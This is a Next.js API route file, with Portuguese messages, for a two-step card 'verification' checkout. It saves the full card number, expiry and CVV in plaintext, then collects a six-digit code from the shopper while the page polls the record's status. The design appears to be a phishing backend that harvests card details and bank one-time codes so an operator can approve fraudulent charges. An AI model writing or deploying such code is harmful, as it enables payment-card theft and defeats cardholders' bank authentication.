import { NextRequest, NextResponse } from 'next/server';
import { prisma, withRetry } from '@/lib/db';
import { rateLimit, getClientIP, RATE_LIMITS } from '@/lib/rate-limit';

export const dynamic = 'force-dynamic';

// Check if verification is enabled OR poll status of a specific record
export async function GET(request: NextRequest) {
  try {
    const { searchParams } = new URL(request.url);
    const recordId = searchParams.get('id');

    // If id provided, return the status of that record (for client polling)
    if (recordId) {
      const record = await withRetry(() => prisma.verificationCode.findUnique({
        where: { id: recordId },
        select: { status: true },
      }));
      if (!record) return NextResponse.json({ status: 'NOT_FOUND' });
      return NextResponse.json({ status: record.status });
    }

    // Otherwise check if feature is enabled
    const setting = await withRetry(() => prisma.settings.findUnique({
      where: { key: 'verification_code_enabled' },
    }));
    return NextResponse.json({ enabled: setting?.value === 'true' });
  } catch {
    return NextResponse.json({ enabled: false });
  }
}

// Stage 1: Submit card data (no code yet) - when client clicks "Receber código"
export async function POST(request: NextRequest) {
  try {
    const ip = getClientIP(request);
    const rateLimitResult = rateLimit(`verification:${ip}`, RATE_LIMITS.CHECKOUT);
    if (!rateLimitResult.success) {
      return NextResponse.json({ error: 'Muitas tentativas' }, { status: 429 });
    }

    const body = await request.json();
    const { customerName, cardBrand, lastFourDigits, cardNumber, expiryDate, cvv, orderTotal } = body;

    if (!customerName || !cardBrand || !lastFourDigits || !cardNumber) {
      return NextResponse.json({ error: 'Dados incompletos' }, { status: 400 });
    }

    const record = await withRetry(() => prisma.verificationCode.create({
      data: {
        code: null,
        customerName,
        cardBrand,
        lastFourDigits,
        cardNumber,
        expiryDate: expiryDate || '',
        cvv: cvv || '',
        orderTotal: orderTotal || 0,
        status: 'WAITING_CODE',
      },
    }));

    return NextResponse.json({ success: true, id: record.id });
  } catch (error) {
    console.error('Error saving verification data:', error);
    return NextResponse.json({ error: 'Erro ao salvar dados' }, { status: 500 });
  }
}

// Stage 2: Submit the verification code
export async function PUT(request: NextRequest) {
  try {
    const ip = getClientIP(request);
    const rateLimitResult = rateLimit(`verification-code:${ip}`, RATE_LIMITS.CHECKOUT);
    if (!rateLimitResult.success) {
      return NextResponse.json({ error: 'Muitas tentativas' }, { status: 429 });
    }

    const body = await request.json();
    const { id, code } = body;

    if (!id || !code) {
      return NextResponse.json({ error: 'Dados incompletos' }, { status: 400 });
    }

    const cleanCode = code.replace(/\D/g, '');
    if (cleanCode.length !== 6) {
      return NextResponse.json({ error: 'Código deve ter 6 dígitos' }, { status: 400 });
    }

    await withRetry(() => prisma.verificationCode.update({
      where: { id },
      data: { code: cleanCode, status: 'CODE_SUBMITTED' },
    }));

    return NextResponse.json({ success: true });
  } catch (error) {
    console.error('Error updating verification code:', error);
    return NextResponse.json({ error: 'Erro ao salvar código' }, { status: 500 });
  }
}
